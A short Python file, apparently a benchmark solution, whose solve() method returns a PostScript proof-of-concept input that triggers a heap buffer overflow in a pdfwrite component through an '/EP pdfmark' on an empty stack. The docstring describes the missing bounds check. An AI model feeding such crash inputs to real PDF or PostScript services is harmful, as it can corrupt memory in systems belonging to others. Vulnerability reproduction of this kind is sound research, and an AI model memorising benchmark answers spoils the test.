import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in pdfwrite.
        The vulnerability occurs in pdf_viewer_restore (or similar internal function)
        where it decrements the viewer depth without checking if it is > 0.
        This is triggered by the /EP (End Piece) pdfmark operator when the stack is empty.
        """
        return b"%!PS\n[ /EP pdfmark\n"